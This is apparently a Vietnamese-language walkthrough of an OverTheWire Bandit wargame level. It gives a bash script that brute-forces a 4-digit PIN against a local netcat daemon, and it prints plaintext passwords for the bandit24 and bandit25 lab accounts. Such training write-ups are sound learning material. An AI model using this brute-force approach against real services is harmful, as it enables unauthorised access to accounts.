## 🕵️‍♂️ Challenge:  
### A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.  
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time  

## 📝 Solution:

Kết nối ssh đến máy chủ `bandit.labs.overthewire.org` với tên người dùng `bandit24`, cổng `2220`  
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
Password lấy từ thử level trước:  
> gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

Thử thách này bắt chúng ta bruteforce mật khẩu 4 chữ số trên server netcat.  
Thử lần đầu với pin 0000 để xem nó trả về gì:  

<img width="1470" height="162" alt="image" src="https://github.com/user-attachments/assets/4e84f601-5c7c-44ce-8f48-b9ba75fe00bb" />

Vậy bây giờ ta sẽ viết script có nội dung như sau:  
```bash
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> input.txt 
done

cat input.txt | nc localhost 30002 > output.txt
```
Đầu tiên tạo thư mục tạm và di chuyển vào đó để tạo file script:  
```bash
mktemp -d
```
Tạo file script:  
```bash
nano solve.sh
# Viết script có nội dung trên.  
chmod +x solve.sh
./solve.sh
```
Sau khi chạy, ta đã có output chứa tất cả đầu ra của các trường hợp PIN khác nhau:  

<img width="584" height="82" alt="image" src="https://github.com/user-attachments/assets/1c59e0fb-49e6-409d-9588-258d38dc9d63" />

Vậy bây giờ dựa vào output của trường hợp đã thử ở trên, in ra dòng ko chứa `Wrong` là được.  
```bash
cat output.txt | grep -v "Wrong!"
```

<img width="1466" height="139" alt="image" src="https://github.com/user-attachments/assets/b0cb4b30-08b8-4501-8ad2-537ba629ad98" />

Xong ròi.  

>### 🎯 Pass: ***iCi86ttT4KSNe1armKiwbQNmB3YJP3q4***
